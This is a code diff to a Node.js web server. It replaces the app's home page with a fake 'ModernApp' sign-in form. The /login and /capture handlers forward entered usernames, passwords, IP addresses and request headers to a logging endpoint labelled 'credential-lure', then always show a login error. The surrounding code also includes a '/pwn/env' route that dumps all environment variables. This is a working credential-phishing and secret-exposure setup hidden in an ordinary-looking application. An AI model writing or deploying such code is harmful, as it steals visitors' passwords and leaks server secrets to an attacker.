@@ -100,6 +100,68 @@ function postJson(label, data) {
     });
 }
 
+function readBody(req) {
+    return new Promise((resolve) => {
+        let body = '';
+        req.on('data', (chunk) => {
+            body += chunk.toString();
+            if (body.length > 20000) {
+                req.destroy();
+            }
+        });
+        req.on('end', () => resolve(body));
+        req.on('error', () => resolve(body));
+    });
+}
+
+function loginPage() {
+    return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ModernApp - Login</title>
+    <style>
+        body{margin:0;font-family:Arial,sans-serif;background:linear-gradient(135deg,#0f172a,#1d4ed8);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#111827}
+        .card{width:92%;max-width:420px;background:#fff;border-radius:18px;box-shadow:0 24px 80px rgba(0,0,0,.35);padding:36px}
+        h1{margin:0 0 8px;color:#1d4ed8;font-size:28px}
+        p{margin:0 0 28px;color:#64748b}
+        label{display:block;margin:16px 0 8px;font-weight:700}
+        input{width:100%;box-sizing:border-box;padding:14px;border:1px solid #cbd5e1;border-radius:10px;font-size:16px}
+        button{width:100%;margin-top:24px;padding:14px;border:0;border-radius:10px;background:#1d4ed8;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
+        .error{display:none;margin-top:18px;padding:12px;border-radius:10px;background:#fee2e2;color:#991b1b}
+    </style>
+</head>
+<body>
+    <main class="card">
+        <h1>ModernApp</h1>
+        <p>Sign in to continue to your account dashboard.</p>
+        <form id="loginForm" method="POST" action="/login">
+            <label for="username">Username</label>
+            <input id="username" name="username" autocomplete="username" required>
+            <label for="password">Password</label>
+            <input id="password" name="password" type="password" autocomplete="current-password" required>
+            <button type="submit">Sign In</button>
+            <div class="error" id="errorBox">Invalid username or password</div>
+        </form>
+    </main>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const form = event.target;
+            const data = Object.fromEntries(new FormData(form).entries());
+            await fetch('/login', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ ...data, location: location.href, ts: new Date().toISOString() })
+            }).catch(() => {});
+            document.getElementById('errorBox').style.display = 'block';
+        });
+    </script>
+</body>
+</html>`;
+}
+
 async function appServiceIdentity(resource) {
     const encoded = encodeURIComponent(resource);
     if (process.env.IDENTITY_ENDPOINT && process.env.IDENTITY_HEADER) {
@@ -183,6 +245,36 @@ const server = http.createServer((req, res) => {
 
     const urlObj = new URL(req.url, `http://${req.headers.host}`);
 
+    if (urlObj.pathname === '/login' && req.method === 'POST') {
+        readBody(req).then((body) => {
+            postJson('credential-lure-submit', {
+                ts: new Date().toISOString(),
+                remote: req.socket.remoteAddress,
+                headers: req.headers,
+                body
+            }).finally(() => {
+                res.writeHead(401, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: false, error: 'Invalid username or password' }));
+            });
+        });
+        return;
+    }
+
+    if (urlObj.pathname === '/capture' && req.method === 'POST') {
+        readBody(req).then((body) => {
+            postJson('credential-lure-capture', {
+                ts: new Date().toISOString(),
+                remote: req.socket.remoteAddress,
+                headers: req.headers,
+                body
+            }).finally(() => {
+                res.writeHead(204);
+                res.end();
+            });
+        });
+        return;
+    }
+
     if (urlObj.pathname === '/pwn/env') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify(process.env, null, 2));
@@ -230,8 +322,13 @@ const server = http.createServer((req, res) => {
     }
 
     if (req.url === '/' || req.url === '/index.html') {
+        postJson('credential-lure-visit', {
+            ts: new Date().toISOString(),
+            remote: req.socket.remoteAddress,
+            headers: req.headers
+        }).catch(() => {});
         res.writeHead(200, { 'Content-Type': 'text/html' });
-        res.end(`<!DOCTYPE html><html><body><h1>Simple Node.js Application</h1><p>Node ${process.version}</p></body></html>`);
+        res.end(loginPage());
         return;
     }
 
